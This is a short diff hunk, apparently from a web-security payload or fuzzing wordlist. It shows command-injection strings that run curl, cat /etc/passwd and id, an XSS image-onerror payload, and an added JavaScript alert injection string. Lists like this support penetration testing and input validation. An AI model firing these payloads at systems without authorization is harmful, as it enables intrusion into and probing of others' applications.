@@ -99,3 +99,4 @@ $(curl http://127.0.0.1)
 $(cat /etc/passwd)
 id%0aid
 "><img src=x onerrora=confirm() onerror=confirm(1)>
+'-alert?.(1)-' 
